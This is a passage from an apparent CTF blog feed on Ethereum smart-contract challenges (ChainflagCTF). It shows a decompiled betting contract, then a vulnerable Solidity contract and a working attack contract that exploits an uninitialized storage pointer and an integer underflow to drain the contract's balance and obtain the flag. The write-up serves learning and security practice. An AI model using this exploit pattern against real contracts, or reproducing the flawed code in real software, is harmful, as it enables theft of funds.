class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br></pre></td><td class="code"><pre><span class="line">contract Contract &#123;</span><br><span class="line">    function main() &#123;</span><br><span class="line">        memory[0x40:0x60] = 0x80;</span><br><span class="line">    </span><br><span class="line">        if (msg.data.length &lt; 0x04) &#123;</span><br><span class="line">        label_0077:</span><br><span class="line">            memory[0x00:0x20] = msg.sender;</span><br><span class="line">            memory[0x20:0x40] = 0x00;</span><br><span class="line">            var temp0 = keccak256(memory[0x00:0x40]);</span><br><span class="line">            storage[temp0] = msg.value / 0x0de0b6b3a7640000 + storage[temp0];</span><br><span class="line">            stop();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            var var0 = msg.data[0x00:0x20] / 0x0100000000000000000000000000000000000000000000000000000000 &amp; 0xffffffff;</span><br><span class="line">        </span><br><span class="line">            if (var0 == 0x645b8b1b) &#123;</span><br><span class="line">                // Dispatch table entry for status(address)</span><br><span class="line">                var var1 = msg.value;</span><br><span class="line">            </span><br><span class="line">                if (var1) &#123; revert(memory[0x00:0x00]); &#125;</span><br><span class="line">            </span><br><span class="line">                var1 = 0x00c6;</span><br><span class="line">                var var2 = msg.data[0x04:0x24] &amp; 0xffffffffffffffffffffffffffffffffffffffff;</span><br><span class="line">                var2 = status(var2);</span><br><span class="line">            </span><br><span class="line">            label_00C6:</span><br><span class="line">                var temp1 = memory[0x40:0x60];</span><br><span class="line">                memory[temp1:temp1 + 0x20] = var2;</span><br><span class="line">                var temp2 = memory[0x40:0x60];</span><br><span class="line">                return memory[temp2:temp2 + temp1 - temp2 + 0x20];</span><br><span class="line">            &#125; else if (var0 == 0x66d16cc3) &#123;</span><br><span class="line">                // Dispatch table entry for profit()</span><br><span class="line">                var1 = msg.value;</span><br><span class="line">            </span><br><span class="line">                if (var1) &#123; revert(memory[0x00:0x00]); &#125;</span><br><span class="line">            </span><br><span class="line">                var1 = 0x00ed;</span><br><span class="line">                profit();</span><br><span class="line">                stop();</span><br><span class="line">            &#125; else if (var0 == 0x7365870b) &#123;</span><br><span class="line">                // Dispatch table entry for bet(uint256)</span><br><span class="line">                var1 = msg.value;</span><br><span class="line">            </span><br><span class="line">                if (var1) &#123; revert(memory[0x00:0x00]); &#125;</span><br><span class="line">            </span><br><span class="line">                var1 = 0x00ed;</span><br><span class="line">                var2 = msg.data[0x04:0x24];</span><br><span class="line">                bet(var2);</span><br><span class="line">                stop();</span><br><span class="line">            &#125; else if (var0 == 0x8c0320de) &#123;</span><br><span class="line">                // Dispatch table entry for payforflag(string,string)</span><br><span class="line">                var1 = msg.value;</span><br><span class="line">            </span><br><span class="line">                if (var1) &#123; revert(memory[0x00:0x00]); &#125;</span><br><span class="line">            </span><br><span class="line">                var temp3 = memory[0x40:0x60];</span><br><span class="line">                var temp4 = msg.data[0x04:0x24];</span><br><span class="line">                var temp5 = msg.data[temp4 + 0x04:temp4 + 0x04 + 0x20];</span><br><span class="line">                memory[0x40:0x60] = temp3 + (temp5 + 0x1f) / 0x20 * 0x20 + 0x20;</span><br><span class="line">                memory[temp3:temp3 + 0x20] = temp5;</span><br><span class="line">                var1 = 0x00ed;</span><br><span class="line">                memory[temp3 + 0x20:temp3 + 0x20 + temp5] = msg.data[temp4 + 0x24:temp4 + 0x24 + temp5];</span><br><span class="line">                var temp6 = memory[0x40:0x60];</span><br><span class="line">                var temp7 = msg.data[0x24:0x44] + 0x04;</span><br><span class="line">                var temp8 = msg.data[temp7:temp7 + 0x20];</span><br><span class="line">                memory[0x40:0x60] = temp6 + (temp8 + 0x1f) / 0x20 * 0x20 + 0x20;</span><br><span class="line">                memory[temp6:temp6 + 0x20] = temp8;</span><br><span class="line">                var2 = temp3;</span><br><span class="line">                memory[temp6 + 0x20:temp6 + 0x20 + temp8] = msg.data[temp7 + 0x20:temp7 + 0x20 + temp8];</span><br><span class="line">                var var3 = temp6;</span><br><span class="line">                payforflag(var2, var3);</span><br><span class="line">                stop();</span><br><span class="line">            &#125; else if (var0 == 0xe3d670d7) &#123;</span><br><span class="line">                // Dispatch table entry for balance(address)</span><br><span class="line">                var1 = msg.value;</span><br><span class="line">            </span><br><span class="line">                if (var1) &#123; revert(memory[0x00:0x00]); &#125;</span><br><span class="line">            </span><br><span class="line">                var1 = 0x00c6;</span><br><span class="line">                var2 = msg.data[0x04:0x24] &amp; 0xffffffffffffffffffffffffffffffffffffffff;</span><br><span class="line">                var2 = balance(var2);</span><br><span class="line">                goto label_00C6;</span><br><span class="line">            &#125; else if (var0 == 0xf0d25268) &#123;</span><br><span class="line">                // Dispatch table entry for transferbalance(address,uint256)</span><br><span class="line">                var1 = msg.value;</span><br><span class="line">            </span><br><span class="line">                if (var1) &#123; revert(memory[0x00:0x00]); &#125;</span><br><span class="line">            </span><br><span class="line">                var1 = 0x00ed;</span><br><span class="line">                var2 = msg.data[0x04:0x24] &amp; 0xffffffffffffffffffffffffffffffffffffffff;</span><br><span class="line">                var3 = msg.data[0x24:0x44];</span><br><span class="line">                transferbalance(var2, var3);</span><br><span class="line">                stop();</span><br><span class="line">            &#125; else &#123; goto label_0077; &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function status(var arg0) returns (var arg0) &#123;</span><br><span class="line">        memory[0x20:0x40] = 0x01;</span><br><span class="line">        memory[0x00:0x20] = arg0;</span><br><span class="line">        return storage[keccak256(memory[0x00:0x40])];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function profit() &#123;</span><br><span class="line">        memory[0x00:0x20] = msg.sender;</span><br><span class="line">        memory[0x20:0x40] = 0x01;</span><br><span class="line">    </span><br><span class="line">        if (storage[keccak256(memory[0x00:0x40])]) &#123; revert(memory[0x00:0x00]); &#125;</span><br><span class="line">    </span><br><span class="line">        memory[0x00:0x20] = msg.sender;</span><br><span class="line">        memory[0x20:0x40] = 0x00;</span><br><span class="line">        var temp0 = keccak256(memory[0x00:0x40]);</span><br><span class="line">        storage[temp0] = storage[temp0] + 0x0a;</span><br><span class="line">        memory[0x20:0x40] = 0x01;</span><br><span class="line">        storage[keccak256(memory[0x00:0x40])] = 0x01;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function bet(var arg0) &#123;</span><br><span class="line">        var var0 = 0x00;</span><br><span class="line">        memory[var0:var0 + 0x20] = msg.sender;</span><br><span class="line">        memory[0x20:0x40] = var0;</span><br><span class="line">        var var1 = var0;</span><br><span class="line">    </span><br><span class="line">        if (0x0a &gt; storage[keccak256(memory[var1:var1 + 0x40])]) &#123; revert(memory[0x00:0x00]); &#125;</span><br><span class="line">    </span><br><span class="line">        memory[0x00:0x20] = msg.sender;</span><br><span class="line">        memory[0x20:0x40] = 0x01;</span><br><span class="line">    </span><br><span class="line">        if (0x02 &lt;= storage[keccak256(memory[0x00:0x40])]) &#123; revert(memory[0x00:0x00]); &#125;</span><br><span class="line">    </span><br><span class="line">        memory[0x00:0x20] = msg.sender;</span><br><span class="line">        memory[0x20:0x40] = 0x00;</span><br><span class="line">        var temp0 = keccak256(memory[0x00:0x40]);</span><br><span class="line">        storage[temp0] = storage[temp0] + ~0x09;</span><br><span class="line">        var0 = block.blockHash(block.number + ~0x00);</span><br><span class="line">        var1 = var0 % 0x03;</span><br><span class="line">    </span><br><span class="line">        if (var1 != arg0) &#123;</span><br><span class="line">            memory[0x00:0x20] = msg.sender;</span><br><span class="line">            memory[0x20:0x40] = 0x01;</span><br><span class="line">            storage[keccak256(memory[0x00:0x40])] = 0x02;</span><br><span class="line">            return;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            memory[0x00:0x20] = msg.sender;</span><br><span class="line">            memory[0x20:0x40] = 0x00;</span><br><span class="line">            var temp1 = keccak256(memory[0x00:0x40]);</span><br><span class="line">            storage[temp1] = storage[temp1] + 0x03e8;</span><br><span class="line">            memory[0x00:0x20] = msg.sender;</span><br><span class="line">            memory[0x20:0x40] = 0x01;</span><br><span class="line">            storage[keccak256(memory[0x00:0x40])] = 0x02;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function payforflag(var arg0, var arg1) &#123;</span><br><span class="line">        memory[0x00:0x20] = msg.sender;</span><br><span class="line">        memory[0x20:0x40] = 0x00;</span><br><span class="line">    </span><br><span class="line">        if (0x0f4240 &gt; storage[keccak256(memory[0x00:0x40])]) &#123; revert(memory[0x00:0x00]); &#125;</span><br><span class="line">    </span><br><span class="line">        if (msg.sender == storage[0x02] &amp; 0xffffffffffffffffffffffffffffffffffffffff) &#123;</span><br><span class="line">            var temp0 = memory[0x40:0x60];</span><br><span class="line">            var temp1 = address(this).balance;</span><br><span class="line">            var temp2;</span><br><span class="line">            temp2, memory[temp0:temp0 + 0x00] = address(storage[0x02] &amp; 0xffffffffffffffffffffffffffffffffffffffff).call.gas(!temp1 * 0x08fc).value(temp1)(memory[temp0:temp0 + 0x00]);</span><br><span class="line">            var var0 = !temp2;</span><br><span class="line">        </span><br><span class="line">            if (!var0) &#123;</span><br><span class="line">            label_0378:</span><br><span class="line">                var0 = 0x6335b7f9c4dff99c3a870eaf18b802774df3aba4e21b72549f3a03b6bc974c90;</span><br><span class="line">                var temp3 = arg0;</span><br><span class="line">                var var1 = temp3;</span><br><span class="line">                var var2 = arg1;</span><br><span class="line">                var temp4 = memory[0x40:0x60];</span><br><span class="line">                var var3 = temp4;</span><br><span class="line">                var var4 = var3;</span><br><span class="line">                var var5 = var4 + 0x20;</span><br><span class="line">                var temp5 = var5 + 0x20;</span><br><span class="line">                memory[var4:var4 + 0x20] = temp5 - var4;</span><br><span class="line">                memory[temp5:temp5 + 0x20] = memory[var1:var1 + 0x20];</span><br><span class="line">                var var6 = temp5 + 0x20;</span><br><span class="line">                var var7 = var1 + 0x20;</span><br><span class="line">                var var8 = memory[var1:var1 + 0x20];</span><br><span class="line">                var var9 = var8;</span><br><span class="line">                var var10 = var6;</span><br><span class="line">                var var11 = var7;</span><br><span class="line">                var var12 = 0x00;</span><br><span class="line">            </span><br><span class="line">                if (var12 &gt;= var9) &#123;</span><br><span class="line">                label_03DD:</span><br><span class="line">                    var temp6 = var8;</span><br><span class="line">                    var6 = temp6 + var6;</span><br><span class="line">                    var7 = temp6 &amp; 0x1f;</span><br><span class="line">                </span><br><span class="line">                    if (!var7) &#123;</span><br><span class="line">                        var temp7 = var6;</span><br><span class="line">                        memory[var5:var5 + 0x20] = temp7 - var3;</span><br><span class="line">                        var temp8 = var2;</span><br><span class="line">                        memory[temp7:temp7 + 0x20] = memory[temp8:temp8 + 0x20];</span><br><span class="line">                        var6 = temp7 + 0x20;</span><br><span class="line">                        var7 = temp8 + 0x20;</span><br><span class="line">                        var8 = memory[temp8:temp8 + 0x20];</span><br><span class="line">                        var9 = var8;</span><br><span class="line">                        var10 = var6;</span><br><span class="line">                        var11 = var7;</span><br><span class="line">                        var12 = 0x00;</span><br><span class="line">                    </span><br><span class="line">                        if (var12 &gt;= var9) &#123;</span><br><span class="line">                        label_043D:</span><br><span class="line">                            var temp9 = var8;</span><br><span class="line">                            var6 = temp9 + var6;</span><br><span class="line">                            var7 = temp9 &amp; 0x1f;</span><br><span class="line">                        </span><br><span class="line">                            if (!var7) &#123;</span><br><span class="line">                                var temp10 = memory[0x40:0x60];</span><br><span class="line">                                log(memory[temp10:temp10 + var6 - temp10], [stack[-8]]);</span><br><span class="line">                                return;</span><br><span class="line">                            &#125; else &#123;</span><br><span class="line">                                var temp11 = var7;</span><br><span class="line">                                var temp12 = var6 - temp11;</span><br><span class="line">                                memory[temp12:temp12 + 0x20] = ~(0x0100 ** (0x20 - temp11) - 0x01) &amp; memory[temp12:temp12 + 0x20];</span><br><span class="line">                                var temp13 = memory[0x40:0x60];</span><br><span class="line">                                log(memory[temp13:temp13 + (temp12 + 0x20) - temp13], [stack[-8]]);</span><br><span class="line">                                return;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; else &#123;</span><br><span class="line">                        label_042E:</span><br><span class="line">                            var temp14 = var12;</span><br><span class="line">                            memory[temp14 + var10:temp14 + var10 + 0x20] = memory[temp14 + var11:temp14 + var11 + 0x20];</span><br><span class="line">                            var12 = temp14 + 0x20;</span><br><span class="line">                        </span><br><span class="line">                            if (var12 &gt;= var9) &#123; goto label_043D; &#125;</span><br><span class="line">                            else &#123; goto label_042E; &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        var temp15 = var7;</span><br><span class="line">                        var temp16 = var6 - temp15;</span><br><span class="line">                        memory[temp16:temp16 + 0x20] = ~(0x0100 ** (0x20 - temp15) - 0x01) &amp; memory[temp16:temp16 + 0x20];</span><br><span class="line">                        var temp17 = temp16 + 0x20;</span><br><span class="line">                        memory[var5:var5 + 0x20] = temp17 - var3;</span><br><span class="line">                        var temp18 = var2;</span><br><span class="line">                        memory[temp17:temp17 + 0x20] = memory[temp18:temp18 + 0x20];</span><br><span class="line">                        var6 = temp17 + 0x20;</span><br><span class="line">                        var7 = temp18 + 0x20;</span><br><span class="line">                        var8 = memory[temp18:temp18 + 0x20];</span><br><span class="line">                        var9 = var8;</span><br><span class="line">                        var10 = var6;</span><br><span class="line">                        var11 = var7;</span><br><span class="line">                        var12 = 0x00;</span><br><span class="line">                    </span><br><span class="line">                        if (var12 &gt;= var9) &#123; goto label_043D; &#125;</span><br><span class="line">                        else &#123; goto label_042E; &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                label_03CE:</span><br><span class="line">                    var temp19 = var12;</span><br><span class="line">                    memory[temp19 + var10:temp19 + var10 + 0x20] = memory[temp19 + var11:temp19 + var11 + 0x20];</span><br><span class="line">                    var12 = temp19 + 0x20;</span><br><span class="line">                </span><br><span class="line">                    if (var12 &gt;= var9) &#123; goto label_03DD; &#125;</span><br><span class="line">                    else &#123; goto label_03CE; &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">            label_036F:</span><br><span class="line">                var temp20 = returndata.length;</span><br><span class="line">                memory[0x00:0x00 + temp20] = returndata[0x00:0x00 + temp20];</span><br><span class="line">                revert(memory[0x00:0x00 + returndata.length]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            memory[0x00:0x20] = msg.sender;</span><br><span class="line">            memory[0x20:0x40] = 0x00;</span><br><span class="line">            storage[keccak256(memory[0x00:0x40])] = 0x00;</span><br><span class="line">            var temp21 = memory[0x40:0x60];</span><br><span class="line">            var temp22 = address(this).balance;</span><br><span class="line">            var temp23;</span><br><span class="line">            temp23, memory[temp21:temp21 + 0x00] = address(storage[0x02] &amp; 0xffffffffffffffffffffffffffffffffffffffff).call.gas(!temp22 * 0x08fc).value(temp22)(memory[temp21:temp21 + 0x00]);</span><br><span class="line">            var0 = !temp23;</span><br><span class="line">        </span><br><span class="line">            if (!var0) &#123; goto label_0378; &#125;</span><br><span class="line">            else &#123; goto label_036F; &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function balance(var arg0) returns (var arg0) &#123;</span><br><span class="line">        memory[0x20:0x40] = 0x00;</span><br><span class="line">        memory[0x00:0x20] = arg0;</span><br><span class="line">        return storage[keccak256(memory[0x00:0x40])];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function transferbalance(var arg0, var arg1) &#123;</span><br><span class="line">        memory[0x00:0x20] = msg.sender;</span><br><span class="line">        memory[0x20:0x40] = 0x00;</span><br><span class="line">    </span><br><span class="line">        if (arg1 &gt; storage[keccak256(memory[0x00:0x40])]) &#123; revert(memory[0x00:0x00]); &#125;</span><br><span class="line">    </span><br><span class="line">        memory[0x00:0x20] = msg.sender;</span><br><span class="line">        memory[0x20:0x40] = 0x00;</span><br><span class="line">        var temp0 = keccak256(memory[0x00:0x40]);</span><br><span class="line">        var temp1 = arg1;</span><br><span class="line">        storage[temp0] = storage[temp0] - temp1;</span><br><span class="line">        memory[0x00:0x20] = arg0 &amp; 0xffffffffffffffffffffffffffffffffffffffff;</span><br><span class="line">        var temp2 = keccak256(memory[0x00:0x40]);</span><br><span class="line">        storage[temp2] = temp1 + storage[temp2];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要反编译知识、EVM知识、操作码知识才能做，先挖个坑，会了再回头写</p><h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2>]]></content>
      
      
      <categories>
          
          <category> 02.ChainflagCTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>09.integer-overflow @hf</title>
      <link href="/2023/07/13/02.ChainflagCTF/09.integer-overflow%20@hf/"/>
      <url>/2023/07/13/02.ChainflagCTF/09.integer-overflow%20@hf/</url>
      
        <content type="html"><![CDATA[<h1 id="integer-overflow-hf"><a href="#integer-overflow-hf" class="headerlink" title="integer-overflow(hf)"></a>integer-overflow(hf)</h1><h2 id="contract"><a href="#contract" class="headerlink" title="contract"></a>contract</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"></span><br><span class="line">contract hf &#123;</span><br><span class="line">    address secret;</span><br><span class="line">    uint count;</span><br><span class="line">    address owner;</span><br><span class="line">    </span><br><span class="line">    mapping(address =&gt; uint) public balanceOf;</span><br><span class="line">    mapping(address =&gt; uint) public gift;</span><br><span class="line">    </span><br><span class="line">    struct node &#123;</span><br><span class="line">        address nodeadress;</span><br><span class="line">        uint nodenumber;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    node public node0;</span><br><span class="line">    </span><br><span class="line">    event SendFlag(string b64email);</span><br><span class="line">    </span><br><span class="line">    constructor()public&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function payforflag(string b64email) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= 100000);</span><br><span class="line">        balanceOf[msg.sender]=0;</span><br><span class="line">        owner.transfer(address(this).balance);</span><br><span class="line">        emit SendFlag(b64email);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    //to fuck</span><br><span class="line">    </span><br><span class="line">    modifier onlySecret() &#123;</span><br><span class="line">        require(msg.sender == secret);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function profit() public&#123;</span><br><span class="line">        require(gift[msg.sender]==0);</span><br><span class="line">        gift[msg.sender]=1;</span><br><span class="line">        balanceOf[msg.sender]+=1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function hfvote() public payable&#123;</span><br><span class="line">        uint geteth=msg.value/1000000000000000000;</span><br><span class="line">        balanceOf[msg.sender]+=geteth;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function ubw() public payable&#123;</span><br><span class="line">        if (msg.value &lt; 2 ether)</span><br><span class="line">        &#123;</span><br><span class="line">            node storage n = node0;</span><br><span class="line">            n.nodeadress=msg.sender;</span><br><span class="line">            n.nodenumber=1;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            n.nodeadress=msg.sender;</span><br><span class="line">            n.nodenumber=2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function fate(address to,uint value) public onlySecret &#123;</span><br><span class="line">        require(balanceOf[msg.sender]-value&gt;=0);</span><br><span class="line">        balanceOf[msg.sender]-=value;</span><br><span class="line">        balanceOf[to]+=value;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="analyses"><a href="#analyses" class="headerlink" title="analyses"></a>analyses</h2><p>The <code>node0</code> has not been initialized yet, so we can change the slot0 &amp; underflow</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">interface Ihf &#123;</span><br><span class="line">    function balanceOf(address) external returns(uint);</span><br><span class="line">    function payforflag(string b64email) public;</span><br><span class="line">    function ubw() public payable;</span><br><span class="line">    function fate(address,uint) public;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract hfAttack&#123;</span><br><span class="line">    Ihf public _hf;</span><br><span class="line"></span><br><span class="line">    constructor(address _addr) public&#123;</span><br><span class="line">        _hf = Ihf(_addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function solve() public payable &#123;</span><br><span class="line">        // The node0 has not been initialized yet, so we can change the slot0:&#x27;secret&#x27;</span><br><span class="line">        // msg.value should be 2 ether or more</span><br><span class="line">        _hf.ubw.value(msg.value)(); </span><br><span class="line">        // the money to send can be any expect address(this)</span><br><span class="line">        _hf.fate(address(0), 1); // underflow</span><br><span class="line">        _hf.payforflag(&quot;successfully&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getBalance() public view returns(uint256)&#123;</span><br><span class="line">        uint256 balance = _hf.balanceOf(address(this));</span><br><span class="line">        return balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function() external payable &#123;&#125; // attention!!!! solve() will revert without this!!!</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2>]]></content>
      
      
      <categories>
          
          <category> 02.ChainflagCTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>08.integer-overflow @bet</title>
      <link href="/2023/07/13/02.ChainflagCTF/08.integer-overflow%20@bet/"/>
      <url>/2023/07/13/02.ChainflagCTF/08.integer-overflow%20@bet/</url>
      
        <content type="html"><![CDATA[<h1 id="integer-overflow-bet"><a href="#integer-overflow-bet" class="headerlink" title="integer-overflow(bet)"></a>integer-overflow(bet)</h1><h2 id="contract"><a href="#contract" class="headerlink" title="contract"></a>contract</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 